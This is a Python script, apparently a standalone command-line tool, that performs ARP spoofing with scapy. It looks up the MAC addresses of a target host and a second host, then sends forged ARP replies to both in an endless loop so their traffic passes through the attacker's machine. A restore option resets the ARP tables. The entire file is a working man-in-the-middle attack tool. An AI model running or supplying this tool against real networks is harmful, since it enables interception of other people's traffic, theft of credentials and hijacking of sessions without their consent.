#!/bin/python
import scapy.all as scapy
import argparse
import os
import time

def arp_ask(target_ip):
    """Send an ARP request to get the MAC address of a target IP."""
    arp_request = scapy.ARP(pdst=target_ip)
    packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request
    answered, _ = scapy.srp(packet, timeout=2, verbose=False)
    
    if not answered:
        print(f"[!] No response from {target_ip}")
        return None
    return answered[0][1].hwsrc  # Return the MAC address of the target

def arp_spoof(target_ip, spoof_ip, target_mac, spoof_mac):
    """Send a fake ARP response to trick the target into associating the wrong MAC address."""
    if not target_mac:
        print(f"[!] Could not spoof {target_ip} - No MAC address found.")
        return
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac, op=2)
    scapy.send(arp_response, verbose=False)

def arp_restore(target_ip, spoof_ip, target_mac, spoof_mac):
    """Restore the correct ARP table entry by sending the real MAC address."""
    if not target_mac or not spoof_mac:
        print(f"[!] Could not restore ARP table for {target_ip} or {spoof_ip}")
        return
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac, op=2)
    scapy.send(arp_response, count=5, verbose=False)  # Send multiple times to ensure update

def spoof(target_ip, spoof_ip):
    """Continuously send ARP spoofing packets until interrupted."""
    own_mac = scapy.get_if_hwaddr(scapy.conf.iface)  # Get the attacker's MAC address

    # Get the MAC addresses of the target and the spoofed IP
    target_mac, spoof_mac = None, None
    while not target_mac or not spoof_mac:
        target_mac = arp_ask(target_ip)
        spoof_mac = arp_ask(spoof_ip)

    print(f"[+] Spoofing {target_ip} ({target_mac}) -> {spoof_ip} with {own_mac}")
    print(f"[+] Spoofing {spoof_ip} ({spoof_mac}) -> {target_ip} with {own_mac}")

    try:
        while True:
            arp_spoof(target_ip, spoof_ip, target_mac, own_mac)
            arp_spoof(spoof_ip, target_ip, spoof_mac, own_mac)
            time.sleep(2)  # Reduce CPU usage
    except KeyboardInterrupt:
        print("\n[+] Restoring ARP tables...")
        arp_restore(target_ip, spoof_ip, target_mac, spoof_mac)
        arp_restore(spoof_ip, target_ip, spoof_mac, target_mac)
        print("[+] ARP tables restored.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument('-t', '--target', type=str, required=True, help='Target IP address')
    parser.add_argument('-s', '--spoof', type=str, required=True, help='IP address to spoof')
    parser.add_argument('-r', '--restore', action='store_true', help='Restore ARP tables')

    args = parser.parse_args()

    if args.restore:
        target_mac = arp_ask(args.target)
        spoof_mac = arp_ask(args.spoof)
        arp_restore(args.target, args.spoof, target_mac, spoof_mac)
        arp_restore(args.spoof, args.target, spoof_mac, target_mac)
        print("[+] ARP tables restored.")
    else:
        spoof(args.target, args.spoof)
